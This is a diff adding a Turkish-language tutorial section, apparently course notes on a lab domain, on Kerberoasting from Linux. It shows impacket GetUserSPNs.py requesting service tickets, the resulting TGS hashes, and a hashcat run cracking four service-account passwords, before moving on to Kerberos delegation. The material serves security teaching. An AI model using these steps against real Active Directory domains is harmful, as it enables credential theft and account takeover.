@@ -961,4 +961,106 @@ Not: Birden fazla SPN denemek için /spn yerine /spns:listofspn.txt kullanabilir
 Şimdi, bir Windows host üzerinden **Kerberoasting** nasıl yapılacağını gördük, bundan sonra bir Linux makinesinden nasıl yapılacağına değineceğiz.
 
 
-### Kerberoasting from Linux
+## Kerberoasting from Linux
+
+### Linux
+
+Linux'tan **Kerberoasting** gerçekleştirmek için, **[impacket](https://github.com/SecureAuthCorp/impacket)** paketinden **[GetUserSPNs.py](https://github.com/fortra/impacket/blob/master/examples/GetUserSPNs.py)** aracını kullanacağız. Bu araç, tüm **Kerberoastable** hesapları arayabilir, hizmet hesabının şifresiyle şifrelenmiş veriyi çıkarabilir ve daha sonra çözmek için **hashcat** ile uyumlu bir **hash** döndürebilir.
+
+**`GetUserSPNs.py`** aracını parametresiz çalıştırmak, önceki bölümde geliştirdiğimiz **`PowerShell FindSPNAccounts.ps1`** script'imizle benzer bir çıktı üretecektir.
+
+```
+GetUserSPNs.py inlanefreight.local/pixis
+Impacket v0.9.22.dev1+20200520.120526.3f1e7ddd - Copyright 2020 SecureAuth
+Corporation
+Password:
+ServicePrincipalName Name MemberOf
+PasswordLastSet LastLogon Delegation
+--------------------------------------- ---------- ---------------------
+-------------------------------- -------------------------- --------- -
+------------
+MSSQL_svc_dev/inlanefreight.local:1443 sqldev CN=Protected
+Users,CN=Users,DC=INLANEFREIGHT,DC=LOCAL 2020-07-27 20:46:20.558388
+<never> unconstrained
+MSSQLSvc/sql01:1433 sqlprod CN=Protected
+Users,CN=Users,DC=INLANEFREIGHT,DC=LOCAL 2020-07-27 20:46:27.558399
+<never>
+MSSQL_svc_qa/inlanefreight.local:1443 sqlqa CN=Domain
+Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL 2020-07-27 20:46:33.792787
+<never>
+MSSQL_svc_test/inlanefreight.local:1443 sql-test
+2020-07-27 20:47:07.574105 <never>
+IIS_dev/inlanefreight.local:80 adam.jones
+2020-07-27 21:35:57.069094 <never>
+
+```
+
+Artık **`Kerberoastable`** hesapların olduğunu bildiğimize göre, her biri için bir **`TGS ticket`** veya **Service Ticket (ST)** talep edebiliriz ve **-request** parametresiyle **hashcat** (ve **John the Ripper**) formatında kırılabilir bir **hash** elde edebiliriz.
+
+```
+GetUserSPNs.py inlanefreight.local/pixis -request
+
+Impacket v0.9.22.dev1+20200520.120526.3f1e7ddd - Copyright 2020 SecureAuth
+Corporation
+Password:
+ServicePrincipalName Name MemberOf
+PasswordLastSet LastLogon Delegation
+--------------------------------------- ---------- ---------------------
+-------------------------------- -------------------------- --------- -
+------------
+MSSQL_svc_dev/inlanefreight.local:1443 sqldev CN=Protected
+Users,CN=Users,DC=INLANEFREIGHT,DC=LOCAL 2020-07-27 20:46:20.558388
+<never> unconstrained
+MSSQLSvc/sql01:1433 sqlprod CN=Protected
+Users,CN=Users,DC=INLANEFREIGHT,DC=LOCAL 2020-07-27 20:46:27.558399
+<never>
+MSSQL_svc_qa/inlanefreight.local:1443 sqlqa CN=Domain
+Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL 2020-07-27 20:46:33.792787 MSSQL_svc_test/inlanefreight.local:1443 sql-test 2020-07-27 20:47:07.574105 IIS_dev/inlanefreight.local:80 adam.jones 2020-07-27 21:35:57.069094 $krb5tgs$23$*sqldev$INLANEFREIGHT.LOCAL$MSSQL_svc_dev/inlanefreight.local~ 1443*$f06349cf7220c21cde1236e53a491a67$c4c2079e9b $krb5tgs$23$*sqlprod$INLANEFREIGHT.LOCAL$MSSQLSvc/sql01~1433*$577b69c3a2ab cff0fc3318fd94f90014$9272d9d177c6147a1b773ba12f95 $krb5tgs$23$*sqlqa$INLANEFREIGHT.LOCAL$MSSQL_svc_qa/inlanefreight.local~14 43*$edaecbbcd610e2dd3ef39d6ea2cb3838$b5dbb92fb35b $krb5tgs$23$*sqltest$INLANEFREIGHT.LOCAL$MSSQL_svc_test/inlanefreight.local~1443*$989e43ca 34c03490e7de627135599ab4$832a1d7 $krb5tgs$23$*adam.jones$INLANEFREIGHT.LOCAL$IIS_dev/inlanefreight.local~80 *$2b9cfebc5043606bbebb9f140bdf48cb$c05bf3d19a3e26
+```
+
+
+### Cracking
+
+**GetUserSPNs.py** aracının farklı **Service Tickets (ST)** ile ilişkilendirilmiş **hash** listesini döndürmesinin ardından, bu hesaplarla ilişkilendirilmiş **clear text** şifreyi elde etmek için **hashcat** kullanacağız. Bunun için **hash-mode** 13100 ( **Kerberos 5, etype 23, TGS-REP** ) kullanılacaktır.
+
+```
+hashcat -m 13100 hashes.txt rockyou.txt
+hashcat (v5.1.0) starting...
+<SNIP>
+$krb5tgs$23$*sqlqa$INLANEFREIGHT.LOCAL$MSSQL_svc_qa/inlanefreight.local~14
+43*$edaecbbcd<SNIP>ec0ef:Welcome1
+$krb5tgs$23$*sqlprod$INLANEFREIGHT.LOCAL$MSSQLSvc/sql01~1433*$577b69c3a2ab
+cff0fc3318fd9<SNIP>7170c:Welcome1
+$krb5tgs$23$*sqltest$INLANEFREIGHT.LOCAL$MSSQL_svc_test/inlanefreight.local~1443*$989e<SNI
+P>9f08c:Welcome1
+$krb5tgs$23$*sqldev$INLANEFREIGHT.LOCAL$MSSQL_svc_dev/inlanefreight.local~
+1443*$f06349c<SNIP>173ca:Welcome1
+<SNIP>
+Session..........: hashcat
+Status...........: Exhausted
+Hash.Type........: Kerberos 5 TGS-REP etype 23
+Hash.Target......: hashes.txt
+Time.Started.....: Wed Aug 12 15:24:44 2020 (20 secs)
+Time.Estimated...: Wed Aug 12 15:25:04 2020 (0 secs)
+Guess.Base.......: File (Tools/Cracking/Wordlists/Passwords/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........: 707.8 kH/s (11.43ms) @ Accel:64 Loops:1 Thr:64 Vec:8
+Recovered........: 4/5 (80.00%) Digests, 4/5 (80.00%) Salts
+Progress.........: 71721925/71721925 (100.00%)
+Rejected.........: 0/71721925 (0.00%)
+Restore.Point....: 14344385/14344385 (100.00%)
+Restore.Sub.#1...: Salt:4 Amplifier:0-1 Iteration:0-1
+Candidates.#1....: $HEX[2321686f74746965] ->
+$HEX[042a0337c2a156616d6f732103]
+```
+
+5 **Kerberoastable** hesap arasında, **hashcat** 4'ünün şifresini buldu: **sqlsa**, **sqlprod**, **sql-test** ve **sqldev**.
+
+
+## Beyond Roasting Attacks
+
+Şimdi hem **`ASREPRoasting`** hem de **`Kerberoasting`** saldırılarını ele aldığımıza göre, **Kerberos Delegation** dünyasına adım atalım ve karşılaşabileceğimiz üç tür delegasyonu ve bunlarla ilişkilendirilen saldırıları tartışalım.
+
+
+### Kerberos Delegations
+
